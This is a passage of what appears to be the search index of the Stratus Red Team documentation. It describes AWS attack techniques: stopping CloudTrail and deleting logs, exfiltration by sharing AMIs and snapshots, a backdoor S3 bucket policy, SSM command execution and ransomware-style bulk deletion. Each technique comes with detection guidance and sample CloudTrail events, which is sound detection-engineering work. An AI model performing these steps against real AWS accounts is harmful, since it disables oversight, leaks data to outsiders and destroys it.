aws.defense-evasion.cloudtrail-lifecycle-rule\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/#detection","title":"Detection","text":"<p>Identify when lifecycle rule with a short expiration is applied to an S3 bucket used for CloudTrail logging.</p> <p>The CloudTrail event <code>PutBucketLifecycle</code> and its attribute  <code>requestParameters.LifecycleConfiguration.Rule.Expiration.Days</code> can be used.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/","title":"Stop CloudTrail Trail","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Defense Evasion</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/#description","title":"Description","text":"<p>Stops a CloudTrail Trail from logging. Simulates an attacker disrupting CloudTrail logging.</p> <p>Warm-up: </p> <ul> <li>Create a CloudTrail Trail.</li> </ul> <p>Detonation: </p> <ul> <li>Call cloudtrail:StopLogging to stop CloudTrail logging.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.cloudtrail-stop\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/#detection","title":"Detection","text":"<p>Identify when a CloudTrail trail is disabled, through CloudTrail's <code>StopLogging</code> event.</p> <p>GuardDuty also provides a dedicated finding type, Stealth:IAMUser/CloudTrailLoggingDisabled.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/","title":"Delete DNS query logs","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Defense Evasion</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/#description","title":"Description","text":"<p>Deletes a Route53 DNS Resolver query logging configuration. Simulates an attacker disrupting DNS logging.</p> <p>Warm-up:</p> <ul> <li>Create a DNS logging configuration.</li> </ul> <p>Detonation:</p> <ul> <li>Delete the DNS logging configuration using <code>route53:DeleteQueryLoggingConfig</code>.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.dns-delete-logs\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/#detection","title":"Detection","text":"<p>Identify when a DNS logging configuration is deleted, through CloudTrail's <code>DeleteQueryLoggingConfig</code> event.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.organizations-leave/","title":"Attempt to Leave the AWS Organization","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.organizations-leave/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Defense Evasion</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.organizations-leave/#description","title":"Description","text":"<p>Attempts to leave the AWS Organization (unsuccessfully - will hit an AccessDenied error).  Security configurations are often defined at the organization level (GuardDuty, SecurityHub, CloudTrail...).  Leaving the organization can disrupt or totally shut down these controls.</p> <p>Warm-up: </p> <ul> <li>Create an IAM role without permissions to run organizations:LeaveOrganization</li> </ul> <p>Detonation: </p> <ul> <li>Call organization:LeaveOrganization to simulate an attempt to leave the AWS Organization.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.organizations-leave/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.organizations-leave\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.organizations-leave/#detection","title":"Detection","text":"<p>Any attempts from a child account to leave its AWS Organization should be considered suspicious. </p> <p>Use the CloudTrail event <code>LeaveOrganization</code>.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/","title":"Remove VPC Flow Logs","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Defense Evasion</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/#description","title":"Description","text":"<p>Removes a VPC Flog Logs configuration from a VPC.</p> <p>Warm-up: </p> <ul> <li>Create a VPC with a VPC Flow Logs configuration.</li> </ul> <p>Detonation: </p> <ul> <li>Remove the VPC Flow Logs configuration.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.vpc-remove-flow-logs\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/#detection","title":"Detection","text":"<p>Using CloudTrail's <code>DeleteFlowLogs</code> event.</p> <p>To reduce the risk of false positives related to VPC deletion in development environments, alerts can be raised only when <code>DeleteFlowLogs</code> is not closely followed by <code>DeleteVpc</code>.</p>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-download-user-data/","title":"Download EC2 Instance User Data","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-download-user-data/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Discovery</li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-download-user-data/#description","title":"Description","text":"<p>Runs ec2:DescribeInstanceAttribute on several instances. This simulates an attacker attempting to retrieve Instance User Data that may include installation scripts and hard-coded secrets for deployment.</p> <p>See: </p> <ul> <li>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html</li> <li>https://hackingthe.cloud/aws/general-knowledge/introduction_user_data/</li> <li>https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/ec2__download_userdata/main.py</li> </ul> <p>Warm-up: </p> <ul> <li>Create an IAM role without permissions to run ec2:DescribeInstanceAttribute</li> </ul> <p>Detonation: </p> <ul> <li>Run ec2:DescribeInstanceAttribute on multiple fictitious instance IDs</li> <li>These calls will result in access denied errors</li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-download-user-data/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.discovery.ec2-download-user-data\n</code></pre>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-download-user-data/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>DescribeInstanceAttribute</code> event.</p> <p>See:</p> <ul> <li>Associated Sigma rule</li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/","title":"Execute Discovery Commands on an EC2 Instance","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Discovery</li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/#description","title":"Description","text":"<p>Runs several discovery commands on an EC2 instance:</p> <ul> <li>sts:GetCallerIdentity</li> <li>s3:ListBuckets</li> <li>iam:GetAccountSummary</li> <li>iam:ListRoles</li> <li>iam:ListUsers</li> <li>iam:GetAccountAuthorizationDetails</li> <li>ec2:DescribeSnapshots</li> <li>cloudtrail:DescribeTrails</li> <li>guardduty:ListDetectors</li> </ul> <p>The commands will be run under the identity of the EC2 instance role, simulating an attacker having compromised an EC2 instance and running discovery commands on it.</p> <p>Warm-up:</p> <ul> <li>Create the prerequisite EC2 instance and VPC (takes a few minutes).</li> </ul> <p>Detonation: </p> <ul> <li>Run the discovery commands, over SSM. The commands will be run under the identity of the EC2 instance role.</li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.discovery.ec2-enumerate-from-instance\n</code></pre>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/#detection","title":"Detection","text":"<p>Identify when an EC2 instance performs unusual enumeration calls.</p> <p>An action can be determined to have been performed by an EC2 instance under its instance role when the attribute <code>userIdentity.arn</code> of a CloudTrail event ends with <code>i-*</code>, for instance:</p> <p><code> arn:aws:sts::012345678901:assumed-role/my-instance-role/i-0adc17a5acb70d9ae </code></p>"},{"location":"attack-techniques/AWS/aws.discovery.ses-enumerate/","title":"Enumerate SES","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.discovery.ses-enumerate/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Discovery</li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ses-enumerate/#description","title":"Description","text":"<p>Simulates an attacker enumerating SES. Attackers frequently use this enumeration technique after having compromised an access key, to use it to launch phishing campaigns or further resell stolen credentials.</p> <p>Warm-up: None.</p> <p>Detonation: </p> <ul> <li>Perform <code>ses:GetAccountSendingEnabled</code> to check if SES sending is enabled.</li> <li>Perform <code>ses:GetSendQuota</code> to discover the current email sending quotas.</li> <li>Perform <code>ses:ListIdentities</code> to discover the list of identities in the account.</li> <li>If identities are found, use <code>ses:GetIdentityVerificationAttributes</code> (only once) to discover verification status of each identity.</li> </ul> <p>References:</p> <ul> <li>https://securitylabs.datadoghq.com/articles/following-attackers-trail-in-aws-methodology-findings-in-the-wild/#most-common-enumeration-techniques</li> <li>https://www.invictus-ir.com/news/ransomware-in-the-cloud</li> <li>https://unit42.paloaltonetworks.com/compromised-cloud-compute-credentials/#post-125981-_kdq0vw6banab</li> <li>https://permiso.io/blog/s/aws-ses-pionage-detecting-ses-abuse/</li> <li>https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me</li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ses-enumerate/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.discovery.ses-enumerate\n</code></pre>"},{"location":"attack-techniques/AWS/aws.discovery.ses-enumerate/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>GetAccountSendingEnabled</code>, <code>GetSendQuota</code> and <code>ListIdentities</code> events.  These can be considered suspicious especially when performed by a long-lived access key, or when the calls span across multiple regions.</p>"},{"location":"attack-techniques/AWS/aws.execution.ec2-launch-unusual-instances/","title":"Launch Unusual EC2 instances","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.execution.ec2-launch-unusual-instances/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Execution</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ec2-launch-unusual-instances/#description","title":"Description","text":"<p>Attempts to launch several unusual EC2 instances (p2.xlarge).</p> <p>Warm-up: Creates an IAM role that doesn't have permissions to launch EC2 instances.  This ensures the attempts is not successful, and the attack technique is fast to detonate.</p> <p>Detonation: Attempts to launch several unusual EC2 instances. The calls will fail as the IAM role does not have sufficient permissions.</p>"},{"location":"attack-techniques/AWS/aws.execution.ec2-launch-unusual-instances/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.execution.ec2-launch-unusual-instances\n</code></pre>"},{"location":"attack-techniques/AWS/aws.execution.ec2-launch-unusual-instances/#detection","title":"Detection","text":"<p>Trough CloudTrail events with the event name <code>RunInstances</code> and error <code>Client.UnauthorizedOperation</code>. The <code>eventSource</code> will be <code>ec2.amazonaws.com</code> and the <code>requestParameters.instanceType</code> field will contain the instance type that was attempted to be launched.</p> <p>Depending on your account limits you might also see <code>VcpuLimitExceeded</code> error codes.</p>"},{"location":"attack-techniques/AWS/aws.execution.ec2-user-data/","title":"Execute Commands on EC2 Instance via User Data","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.execution.ec2-user-data/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Execution</li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ec2-user-data/#description","title":"Description","text":"<p>Executes code on a Linux EC2 instance through User Data.</p> <p>References:</p> <ul> <li>https://hackingthe.cloud/aws/exploitation/local-priv-esc-mod-instance-att/</li> <li>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html</li> </ul> <p>Warm-up:</p> <ul> <li>Create the prerequisite EC2 instance and VPC (takes a few minutes).</li> </ul> <p>Detonation:</p> <ul> <li>Stop the instance</li> <li>Use ModifyInstanceAttribute to inject a malicious script in user data</li> <li>Start the instance</li> <li>Upon starting, the malicious script in user data is automatically executed as the root user</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ec2-user-data/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.execution.ec2-user-data\n</code></pre>"},{"location":"attack-techniques/AWS/aws.execution.ec2-user-data/#detection","title":"Detection","text":"<p>Identify when the following sequence of CloudTrail events occur in a short period of time (e.g., &lt; 1 hour)</p> <ol> <li><code>StopInstances</code> (necessary, because the user data of an instance cannot be changed when it's running)</li> <li><code>ModifyInstanceAttribute</code> with <code>requestParameters.userData</code> non-empty</li> </ol> <p>When not possible to perform such correlation, alerting on the second event only is an option. It's generally not  expected that the user data of an EC2 instance changes often, especially with the popularity of immutable machine images, provisioned before instantiation.</p>"},{"location":"attack-techniques/AWS/aws.execution.ssm-send-command/","title":"Usage of ssm:SendCommand on multiple instances","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.execution.ssm-send-command/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Execution</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ssm-send-command/#description","title":"Description","text":"<p>Simulates an attacker utilizing AWS Systems Manager (SSM) to execute commands through SendCommand on multiple EC2 instances.</p> <p>Warm-up:</p> <ul> <li>Create multiple EC2 instances and a VPC (takes a few minutes).</li> </ul> <p>Detonation: </p> <ul> <li>Runs <code>ssm:SendCommand</code> on several EC2 instances, to execute the command <code>echo \"id=$(id), hostname=$(hostname)\"</code> on each of them.</li> </ul> <p>References:</p> <ul> <li>https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/#send-command</li> <li>https://www.chrisfarris.com/post/aws-ir/</li> <li>https://www.invictus-ir.com/news/aws-cloudtrail-cheat-sheet</li> <li>https://securitycafe.ro/2023/01/17/aws-post-explitation-with-ssm-sendcommand/</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ssm-send-command/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.execution.ssm-send-command\n</code></pre>"},{"location":"attack-techniques/AWS/aws.execution.ssm-send-command/#detection","title":"Detection","text":"<p>Identify, through CloudTrail's <code>SendCommand</code> event, especially when <code>requestParameters.instanceIds</code> contains several instances. Sample event:</p> <pre><code>{\n  \"eventSource\": \"ssm.amazonaws.com\",\n  \"eventName\": \"SendCommand\",\n  \"requestParameters\": {\n    \"instanceIds\": [\n      \"i-0f364762ca43f9661\",\n      \"i-0a86d1f61db2b9b5d\",\n      \"i-08a69bfbe21c67e70\"\n    ],\n    \"documentName\": \"AWS-RunShellScript\",\n    \"parameters\": \"HIDDEN_DUE_TO_SECURITY_REASONS\",\n    \"interactive\": false\n  }\n}\n</code></pre> <p>While this technique uses a single call to <code>ssm:SendCommand</code> on several instances, an attacker may use one call per instance to execute commands on. In that case, the <code>SendCommand</code> event will be emitted for each call.</p>"},{"location":"attack-techniques/AWS/aws.execution.ssm-start-session/","title":"Usage of ssm:StartSession on multiple instances","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.execution.ssm-start-session/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Execution</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ssm-start-session/#description","title":"Description","text":"<p>Simulates an attacker utilizing AWS Systems Manager (SSM) StartSession to gain unauthorized interactive access to multiple EC2 instances.</p> <p>Warm-up:</p> <ul> <li>Create multiple EC2 instances and a VPC (takes a few minutes).</li> </ul> <p>Detonation: </p> <ul> <li>Initiates a connection to the EC2 for a Session Manager session.</li> </ul> <p>References:</p> <ul> <li>https://awstip.com/responding-to-an-attack-in-aws-9048a1a551ac (evidence of usage in the wild)</li> <li>https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/#session-manager</li> <li>https://unit42.paloaltonetworks.com/cloud-lateral-movement-techniques/</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ssm-start-session/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.execution.ssm-start-session\n</code></pre>"},{"location":"attack-techniques/AWS/aws.execution.ssm-start-session/#detection","title":"Detection","text":"<p>Identify, through CloudTrail's <code>StartSession</code> event, when a user is starting an interactive session to multiple EC2 instances. Sample event:</p> <pre><code>{\n  \"eventSource\": \"ssm.amazonaws.com\",\n  \"eventName\": \"StartSession\",\n  \"requestParameters\": {\n    \"target\": \"i-123456\"\n  },\n  \"responseElements\": {\n        \"sessionId\": \"...\",\n        \"tokenValue\": \"Value hidden due to security reasons.\",\n        \"streamUrl\": \"wss://ssmmessages.eu-west-1.amazonaws.com/v1/data-channel/...\"\n   },\n}\n</code></pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/","title":"Open Ingress Port 22 on a Security Group","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Exfiltration</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/#description","title":"Description","text":"<p>Opens ingress traffic on port 22 from the Internet (0.0.0.0/0).</p> <p>Warm-up: </p> <ul> <li>Create a VPC and a security group inside it.</li> </ul> <p>Detonation: </p> <ul> <li>Call ec2:AuthorizeSecurityGroupIngress to allow ingress traffic on port 22 from 0.0.0.0/0.</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.exfiltration.ec2-security-group-open-port-22-ingress\n</code></pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/#detection","title":"Detection","text":"<p>You can use the CloudTrail event <code>AuthorizeSecurityGroupIngress</code> when:</p> <ul> <li><code>requestParameters.cidrIp</code> is <code>0.0.0.0/0</code> (or an unknown external IP)</li> <li>and <code>requestParameters.fromPort</code>/<code>requestParameters.toPort</code> is not a commonly exposed port or corresponds to a known administrative protocol such as SSH or RDP</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ami/","title":"Exfiltrate an AMI by Sharing It","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ami/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Exfiltration</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ami/#description","title":"Description","text":"<p>Exfiltrates an AMI by sharing it with an external AWS account.</p> <p>Warm-up: </p> <ul> <li>Create an AMI.</li> </ul> <p>Detonation: </p> <ul> <li>Share the AMI with an external, fictitious AWS account.</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ami/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.exfiltration.ec2-share-ami\n</code></pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ami/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>ModifyImageAttribute</code> event, when <code>requestParameters.launchPermission</code> shows that the AMI was shared with a new or unknown AWS account, such as:</p> <pre><code>\"requestParameters\": {\n  \"launchPermission\": {\n    \"add\": {\n      \"items\": [{ \"userId\": \"012345678901\" }]\n    }\n  },\n  \"attributeType\": \"launchPermission\",\n  \"imageId\": \"ami-0b87ea1d007078d18\"\n}</code></pre> <p>An attacker can also make an AMI completely public. In this case, the <code>item</code> entry  will look like <code>{\"groups\":\"all\"}</code>. </p>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/","title":"Exfiltrate EBS Snapshot by Sharing It","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Exfiltration</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/#description","title":"Description","text":"<p>Exfiltrates an EBS snapshot by sharing it with an external AWS account.</p> <p>Warm-up: </p> <ul> <li>Create an EBS volume and a snapshot.</li> </ul> <p>Detonation: </p> <ul> <li>Call ec2:ModifySnapshotAttribute to share the snapshot with an external, fictitious AWS account.</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>ModifySnapshotAttribute</code> event, when <code>requestParameters.createVolumePermission</code> shows that the EBS snapshot was shared with a new or unknown AWS account, such as:</p> <pre><code>\"requestParameters\": {\n  \"snapshotId\": \"snap-01b3f7d87a02559a1\",\n  \"attributeType\": \"CREATE_VOLUME_PERMISSION\",\n  \"createVolumePermission\": {\n    \"add\": {\n      \"items\": [{ \"userId\": \"111111111111\" }]\n    }\n  }\n}</code></pre> <p>An attacker can also make an EBS snapshot completely public. In this case, the <code>item</code> entry  will look like <code>{\"groups\":\"all\"}</code>. </p> <p>When an attacker copies the snapshot to their own AWS account or creates an EBS volume for it, the <code>SharedSnapshotCopyInitiated</code> (respectively <code>SharedSnapshotVolumeCreated</code>) event is logged (see AWS docs).  In that case, <code>userIdentity.accountId</code> contains the attacker's account ID and <code>recipientAccountId</code> contains the victim's account ID where the snapshot was originally created.</p> <pre><code>{\n  \"userIdentity\": {\n    \"invokedBy\": \"ec2.amazonaws.com\",\n    \"type\": \"AWSAccount\",\n    \"accountId\": \"999999999999\"\n  },\n  \"eventSource\": \"ec2.amazonaws.com\",\n  \"eventVersion\": \"1.08\",\n  \"eventTime\": \"2022-09-27T07:58:49Z\",\n  \"service\": \"cloudtrail\",\n  \"eventName\": \"SharedSnapshotCopyInitiated\",\n  \"eventType\": \"AwsServiceEvent\",\n  \"eventCategory\": \"Management\",\n  \"awsRegion\": \"us-east-1\",\n    \"serviceEventDetails\": {\n    \"snapshotId\": \"snap-12345\"\n  },\n  \"readOnly\": false,\n  \"managementEvent\": true,\n  \"recipientAccountId\": \"111111111111\"\n }\n </code></pre> <p>Note that detonating this attack technique with Stratus Red Team does not simulate an attacker accessing the snapshot from their account (only sharing it publicly from your account).</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/","title":"Exfiltrate RDS Snapshot by Sharing","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Exfiltration</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/#description","title":"Description","text":"<p>Shares a RDS Snapshot with an external AWS account to simulate an attacker exfiltrating a database.</p> <p>Warm-up:</p> <ul> <li>Create a RDS Instance (slow, around 10 minutes)</li> <li>Create a RDS Snapshot</li> </ul> <p>Detonation:</p> <ul> <li>Call rds:ModifyDBSnapshotAttribute to share the snapshot with an external AWS account</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.exfiltration.rds-share-snapshot\n</code></pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>ModifyDBSnapshotAttribute</code> event, when both:</p> <ul> <li><code>requestParameters.attributeName</code> is <code>restore</code></li> <li>and, <code>requestParameters.launchPermission</code> shows that the RDS snapshot was shared with a new or unknown AWS account, such as:</li> </ul> <pre><code>\"requestParameters\": {\n  \"dBSnapshotIdentifier\": \"my-db-snapshot\",\n  \"attributeName\": \"restore\"\n  \"valuesToAdd\": [\"193672423079\"],\n}</code></pre> <p>An attacker can also make an RDS snapshot completely public. In this case, the value of <code>valuesToAdd</code> is <code>[\"all\"]</code>. </p>"},{"location":"attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/","title":"Backdoor an S3 Bucket via its Bucket Policy","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Exfiltration</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/#description","title":"Description","text":"<p>Exfiltrates data from an S3 bucket by backdooring its Bucket Policy to allow access from an external, fictitious AWS account.</p> <p>Warm-up: </p> <ul> <li>Create an S3 bucket.</li> </ul> <p>Detonation: </p> <ul> <li>Backdoor the S3 Bucket Policy by setting the following Bucket Policy:</li> </ul> <pre>\n<code>\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:GetBucketLocation\",\n        \"s3:ListBucket\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::%s/*\",\n        \"arn:aws:s3:::%s\"\n      ]\n    }\n  ]\n}\n</code>\n</pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.exfiltration.s3-backdoor-bucket-policy\n</code></pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/#detection","title":"Detection","text":"<ul> <li> <p>Using CloudTrail's <code>PutBucketPolicy</code> event.</p> </li> <li> <p>Through GuardDuty's Policy:S3/BucketAnonymousAccessGranted finding,  if the S3 bucket was made public (and not only shared with an attacker-controlled AWS account).</p> </li> <li> <p>Through IAM Access Analyzer, which generates a finding when an S3 bucket is made public or accessible from another account.</p> </li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-batch-deletion/","title":"S3 Ransomware through batch file deletion","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-batch-deletion/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Impact</li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-batch-deletion/#description","title":"Description","text":"<p>Simulates S3 ransomware activity that empties a bucket through batch deletion, then uploads a ransom note.</p> <p>Warm-up: </p> <ul> <li>Create an S3 bucket, with versioning enabled</li> <li>Create a number of files in the bucket, with random content and extensions</li> </ul> <p>Detonation: </p> <ul> <li>List all available objects and their versions in the bucket</li> <li>Delete all objects in the bucket in one request, using DeleteObjects</li> <li>Upload a ransom note to the bucket</li> </ul> <p>Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket.</p> <p>References:</p> <ul> <li>The anatomy of a ransomware event targeting S3 (re:Inforce, 2022)</li> <li>The anatomy of ransomware event targeting data residing in Amazon S3 (AWS Security Blog)</li> <li>Ransomware in the cloud</li> <li>https://www.firemon.com/what-you-need-to-know-about-ransomware-in-aws/</li> <li>https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/</li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-batch-deletion/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.impact.s3-ransomware-batch-deletion\n</code></pre>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-batch-deletion/#detection","title":"Detection","text":"<p>You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or deleted in the bucket.  In general, this can be done through CloudTrail S3 data events (<code>DeleteObject</code>, <code>DeleteObjects</code>, <code>GetObject</code>), CloudWatch metrics (<code>NumberOfObjects</code>), or GuardDuty findings (<code>Exfiltration:S3/AnomalousBehavior</code>, <code>Impact:S3/AnomalousBehavior.Delete</code>).</p> <p>Sample <code>DeleteObjects</code> event, shortened for readability:</p> <pre><code>{\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"DeleteObjects\",\n  \"eventCategory\": \"Data\"\n  \"managementEvent\": false,\n  \"readOnly\": false\n  \"requestParameters\": {\n    \"bucketName\": \"target-bucket\",\n    \"Host\": \"target-bucket.s3.us-east-1.amazonaws.com\",\n    \"delete\": \"\",\n    \"x-id\": \"DeleteObjects\"\n  },\n  \"responseElements\": null,\n  \"resources\": [\n    {\n      \"type\": \"AWS::S3::Object\",\n      \"ARNPrefix\": \"arn:aws:s3:::target-bucket/\"\n    },\n    {\n      \"accountId\": \"012345678901\",\n      \"type\": \"AWS::S3::Bucket\",\n      